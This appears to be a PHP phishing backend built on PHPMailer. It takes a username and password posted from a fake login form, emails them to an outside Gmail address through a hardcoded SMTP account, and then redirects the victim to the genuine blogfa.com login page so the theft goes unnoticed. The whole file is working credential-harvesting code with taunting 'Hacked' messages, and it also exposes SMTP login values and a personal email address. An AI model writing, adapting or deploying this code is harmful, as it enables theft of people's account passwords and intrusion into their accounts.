<?php

use PHPMailer\PHPMailer\PHPMailer;

use PHPMailer\PHPMailer\Exception;



require './src/Exception.php';

require './src/PHPMailer.php';

require './src/SMTP.php';



$mail = new PHPMailer(true);

try {

//Server settings

$mail->SMTPDebug = 2; // Enable verbose debug output

$mail->isSMTP(); // Set mailer to use SMTP

$mail->Host = 'sandbox.smtp.mailtrap.io'; // Specify main and backup SMTP servers

$mail->SMTPAuth = true; // Enable SMTP authentication

$mail->Username = '60c1208a775f5b'; // SMTP username

$mail->Password = 'd0d5ccaba9c30c'; // SMTP password

//$mail->SMTPSecure = 'none'; // Enable TLS encryption, [ICODE]ssl[/ICODE] also accepted

$mail->SMTPSecure = false;

$mail->SMTPAutoTLS = false;

$mail->Port = 2525; // TCP port to connect to



//Recipients

$mail->setFrom('hacker@nashenas.ir', 'Mailer');

$mail->addAddress('abbas.sohrabi@gmail.com', 'abbas'); // Add a recipient



// Attachments

// $mail->addAttachment('/home/user/public_html/attachment.txt'); // Add attachments

//$mail->addAttachment('/home/user/public_html/image.jpg', 'new.jpg'); // Optional name



// Content
$username = $_POST['username'];
$password = $_POST['password'];
$mail->isHTML(true); // Set email format to HTML

$mail->Subject = 'Your account Hacked By Abbas Sohrabi Nezhad';

$mail->Body = "<h1>Hello</h1><br><h5>Ha Ha HA Your Info Hacked</h5><br><h5><p>User name = $username</p></h5><br><h5><p>Password = $password</p></h5>";

$mail->AltBody = 'Hacked';



$mail->send();

echo 'Message has been sent';
header('Location: https://www.blogfa.com/desktop/login.aspx?r=638192941293546809');


} catch (Exception $e) {

echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";

}